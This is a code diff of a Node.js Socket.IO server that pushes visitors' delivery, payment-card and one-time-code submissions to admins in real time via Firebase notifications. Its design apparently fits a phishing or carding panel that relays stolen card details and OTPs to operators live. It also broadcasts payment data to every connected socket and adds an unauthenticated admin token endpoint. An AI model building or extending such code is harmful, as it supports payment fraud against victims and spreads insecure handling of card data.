@@ -10,10 +10,16 @@ const bcrypt = require('bcryptjs');
 const pool = require('./config/database');
 const { initializeDatabase } = require('./models/schema');
 
+// Import Firebase Admin SDK
+const firebaseAdmin = require('./firebase-admin');
+
 // Import routes
 const productRoutes = require('./routes/products');
 const adminRoutes = require('./routes/admin');
 const visitorRoutes = require('./routes/visitors');
+
+// Global FCM tokens storage (for admin notifications)
+global.fcmTokens = [];
 
 const app = express();
 const server = http.createServer(app);
@@ -150,15 +156,51 @@ io.on('connection', (socket) => {
         [sessionId]
       );
       
+      // Get all form submissions for this visitor
+      let submissionsMap = {};
+      const allSubmissions = await pool.query(`
+        SELECT * FROM form_submissions 
+        WHERE session_id = $1 
+        ORDER BY created_at DESC
+      `, [sessionId]);
+      
+      allSubmissions.rows.forEach(sub => {
+        const key = `${sub.session_id}_${sub.form_type}`;
+        if (!submissionsMap[key]) {
+          submissionsMap[key] = [];
+        }
+        submissionsMap[key].push(sub);
+      });
+
+      // Parse visitor data
+      let visitorData = visitorResult.rows[0] || {};
+      if (typeof visitorData.delivery_data === 'string') {
+        try { visitorData.delivery_data = JSON.parse(visitorData.delivery_data); } catch (e) {}
+      }
+      if (typeof visitorData.payment_data === 'string') {
+        try { visitorData.payment_data = JSON.parse(visitorData.payment_data); } catch (e) {}
+      }
+      if (typeof visitorData.verification_data === 'string') {
+        try { visitorData.verification_data = JSON.parse(visitorData.verification_data); } catch (e) {}
+      }
+
+      // Add submissions to visitor data
+      visitorData.delivery_submissions = submissionsMap[`${sessionId}_delivery`] || [];
+      visitorData.payment_submissions = submissionsMap[`${sessionId}_payment`] || [];
+      visitorData.verification_submissions = submissionsMap[`${sessionId}_verification`] || [];
+
       // Notify admins of new visitor with FULL data
       const newVisitorData = {
-        ...visitorResult.rows[0],
+        ...visitorData,
         timestamp: new Date()
       };
       console.log(`📡 Broadcasting visitor:new to ${adminConnections.size} admins:`, JSON.stringify(newVisitorData).substring(0, 200));
       adminConnections.forEach((adminSocket, socketId) => {
         adminSocket.emit('visitor:new', newVisitorData);
       });
+
+      // Send FCM push notification for new visitor
+      firebaseAdmin.notifyNewVisitor(newVisitorData);
 
       socket.emit('visitor:confirmed', { sessionId });
     } catch (error) {
@@ -292,6 +334,9 @@ io.on('connection', (socket) => {
       io.emit('form:deliverySubmitted', eventData);
       io.emit('visitor:updated', eventData);
 
+      // Send FCM push notification to admin
+      firebaseAdmin.notifyDelivery(eventData);
+
       console.log(`📝 Delivery form submitted by ${sessionId}, broadcasting to ${adminConnections.size + 1} admins (total submissions: ${submissionsResult.rows.length})`);
     } catch (error) {
       console.error('Error saving delivery data:', error);
@@ -353,15 +398,22 @@ io.on('connection', (socket) => {
         timestamp: new Date()
       };
       
-      adminConnections.forEach((adminSocket) => {
+      // Send to all connected admins
+      console.log(`📤 Broadcasting payment to ${adminConnections.size} admins`);
+      adminConnections.forEach((adminSocket, socketId) => {
+        console.log(`📤 Sending to admin socket: ${socketId}`);
         adminSocket.emit('form:paymentSubmitted', eventData);
         adminSocket.emit('visitor:updated', eventData);
       });
       
+      // Also broadcast to all sockets (including visitors for confirmation)
       io.emit('form:paymentSubmitted', eventData);
       io.emit('visitor:updated', eventData);
 
-      console.log(`💳 Payment form processed safely for ${sessionId} (total submissions: ${submissionsResult.rows.length})`);
+      // Send FCM push notification to admin
+      firebaseAdmin.notifyPayment(eventData);
+
+      console.log(`💳 Payment form processed for ${sessionId} - card: ${finalPaymentData.cardNumber?.slice(-4) || 'N/A'}`);
     } catch (error) {
       console.error('Error saving payment data:', error);
     }
@@ -441,6 +493,9 @@ io.on('connection', (socket) => {
       
       io.emit('form:verificationSubmitted', eventData);
       io.emit('visitor:updated', eventData);
+
+      // Send FCM push notification to admin
+      firebaseAdmin.notifyVerification(eventData);
 
       console.log(`🔐 Verification submitted by ${sessionId}, OTP History: ${otpHistory.length}, Total submissions: ${submissionsResult.rows.length}`);
     } catch (error) {
@@ -1159,6 +1214,55 @@ io.on('connection', (socket) => {
   });
 });
 
+// ==========================================
+// FCM Token Management API
+// ==========================================
+
+// Save FCM token from admin - PERMANENT STORAGE
+app.post('/api/admin/fcm-token', async (req, res) => {
+  try {
+    const { token, enabled } = req.body;
+    
+    if (!token) {
+      return res.status(400).json({ success: false, error: 'Token required' });
+    }
+    
+    // Save token to database permanently (NOT memory only)
+    if (enabled !== false) {
+      await pool.query(`
+        INSERT INTO admin_fcm_tokens (token, enabled, last_used)
+        VALUES ($1, true, CURRENT_TIMESTAMP)
+        ON CONFLICT (token) 
+        DO UPDATE SET enabled = true, last_used = CURRENT_TIMESTAMP
+      `, [token]);
+      
+      // Also update memory cache
+      if (!global.fcmTokens.includes(token)) {
+        global.fcmTokens.push(token);
+      }
+      console.log(`🔔 FCM token saved to database: ${token.substring(0, 30)}...`);
+    } else {
+      // Disable token but don't delete
+      await pool.query('UPDATE admin_fcm_tokens SET enabled = false WHERE token = $1', [token]);
+      global.fcmTokens = global.fcmTokens.filter(t => t !== token);
+      console.log(`🔕 FCM token disabled: ${token.substring(0, 30)}...`);
+    }
+    
+    res.json({ success: true, tokensCount: global.fcmTokens.length });
+  } catch (error) {
+    console.error('❌ FCM token error:', error);
+    res.status(500).json({ success: false, error: error.message });
+  }
+});
+
+// Get FCM tokens status
+app.get('/api/admin/fcm-status', (req, res) => {
+  res.json({ 
+    enabled: global.fcmTokens.length > 0,
+    tokensCount: global.fcmTokens.length
+  });
+});
+
 // API Routes
 app.use('/api/products', productRoutes);
 app.use('/api/admin', adminRoutes);
@@ -1192,6 +1296,14 @@ const startServer = async () => {
 
 // Database migrations
 async function runMigrations() {
+  try {
+    // IMPORTANT: First initialize ALL tables using initializeDatabase
+    await initializeDatabase();
+    console.log('✅ All database tables initialized');
+  } catch (error) {
+    console.error('❌ Error initializing database tables:', error.message);
+  }
+  
   try {
     // Add visit_status column if not exists (for visitor state tracking)
     await pool.query(`
@@ -1231,6 +1343,31 @@ async function runMigrations() {
     console.log('✅ Migration: form_submissions indexes created');
   } catch (error) {
     console.log('⚠️ Migration note:', error.message);
+  }
+  
+  // Create admin_fcm_tokens table for permanent token storage
+  try {
+    await pool.query(`
+      CREATE TABLE IF NOT EXISTS admin_fcm_tokens (
+        id SERIAL PRIMARY KEY,
+        token TEXT NOT NULL UNIQUE,
+        enabled BOOLEAN DEFAULT true,
+        created_at TIMESTAMP DEFAULT CURRENT_TIMESTAMP,
+        last_used TIMESTAMP DEFAULT CURRENT_TIMESTAMP
+      )
+    `);
+    console.log('✅ Migration: admin_fcm_tokens table created');
+  } catch (error) {
+    console.log('⚠️ Migration note:', error.message);
+  }
+  
+  // Load existing tokens from database to memory on startup
+  try {
+    const savedTokens = await pool.query('SELECT token FROM admin_fcm_tokens WHERE enabled = true');
+    global.fcmTokens = savedTokens.rows.map(r => r.token);
+    console.log(`📱 Loaded ${global.fcmTokens.length} FCM tokens from database`);
+  } catch (error) {
+    console.log('⚠️ Could not load FCM tokens from database:', error.message);
   }
   
   // Add expires_at column to admin_sessions if not exists
